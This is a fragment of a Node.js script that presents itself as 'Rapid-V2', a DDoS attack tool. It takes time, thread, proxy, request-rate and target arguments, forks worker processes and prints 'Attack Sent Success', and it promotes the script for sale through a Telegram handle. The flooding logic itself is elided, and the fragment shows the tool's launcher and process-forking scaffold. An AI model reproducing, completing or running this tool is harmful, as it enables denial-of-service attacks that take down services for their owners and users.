...
if (process.argv.length < 8){console.log(`Rapid-V2 GET <Time> <Threads> <Proxys> <RQ/S> <Targets>\nGet Script DDoS Dms Tele @duongngocc2806`); process.exit();}
const headers = {};
...
if (cluster.isMaster) {
   for (let counter = 1; counter <= args.threads; counter++) {
       cluster.fork();
       console.clear()
       console.log(`Rapid v2 | 𓂄𓆩 Cá 𓆪𓂁︎ | Attack Sent Success`)
       console.log(`Methods Power By : @duongngocc2806 | Version : 2.0`)
       console.log(`-----------------------------------`)
   }
